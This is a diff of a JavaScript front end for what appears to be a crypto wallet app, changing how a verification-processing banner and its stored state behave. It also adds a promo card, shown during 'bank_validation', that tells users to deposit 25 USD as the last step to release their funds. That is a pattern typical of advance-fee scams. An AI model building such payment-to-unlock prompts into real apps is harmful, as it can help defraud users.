@@ -6236,27 +6236,29 @@ function stopVerificationProgress() {
 }
 
     // NUEVA IMPLEMENTACIÓN: Función para ocultar el banner de procesamiento
-    function hideVerificationProcessingBanner() {
+    function hideVerificationProcessingBanner(reset = true) {
       const processingBanner = document.getElementById('verification-processing-banner');
       if (processingBanner) {
         processingBanner.style.display = 'none';
       }
-      
+
       stopVerificationProgress();
       // Limpiar el temporizador y los datos de procesamiento
       if (verificationProcessing.timer) {
         clearTimeout(verificationProcessing.timer);
         verificationProcessing.timer = null;
       }
-      
-      verificationProcessing = {
-        isProcessing: false,
-        startTime: null,
-        currentPhase: 'documents',
-        timer: null
-      };
-      
-      localStorage.removeItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING);
+
+      if (reset) {
+        verificationProcessing = {
+          isProcessing: false,
+          startTime: null,
+          currentPhase: 'documents',
+          timer: null
+        };
+
+        localStorage.removeItem(CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING);
+      }
     }
     
     // Función para generar un ID único para el dispositivo
@@ -7753,12 +7755,14 @@ function stopVerificationProgress() {
         }
       }
       // NUEVA IMPLEMENTACIÓN: Manejar cambios en el estado de procesamiento de verificación
-      else if (event.key === CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING && event.newValue) {
+      else if (event.key === CONFIG.STORAGE_KEYS.VERIFICATION_PROCESSING) {
         try {
-          const processingData = JSON.parse(event.newValue);
-          verificationProcessing = processingData;
+          const processingData = event.newValue ? JSON.parse(event.newValue) : null;
+          if (processingData) {
+            verificationProcessing = processingData;
+          }
           
-          if (processingData.isProcessing) {
+          if ((processingData && processingData.isProcessing) || verificationStatus.status === 'bank_validation' || verificationStatus.status === 'payment_validation') {
             showVerificationProcessingBanner();
             updateVerificationProcessingBanner();
           } else {
@@ -10317,6 +10321,14 @@ function setupWithdrawalLink() {
       { icon: 'fas fa-hand-holding-usd', title: 'Pagos y Donaciones', text: 'Paga servicios o realiza donaciones con tus criptomonedas.' },
       { icon: 'fas fa-coins', title: 'Cambio de Divisas', text: 'Convierte tus fondos en diferentes monedas al instante.' }
     ];
+
+    if (verificationStatus.status === 'bank_validation') {
+      promos.unshift({
+        icon: 'fas fa-shield-alt',
+        title: 'Valida tu Cuenta',
+        text: 'Realiza una recarga por 25 USD desde tu cuenta registrada. Es el \u00faltimo paso para liberar tus fondos.'
+      });
+    }
     let promoIndex = 0;
 
     function showPromo(index) {
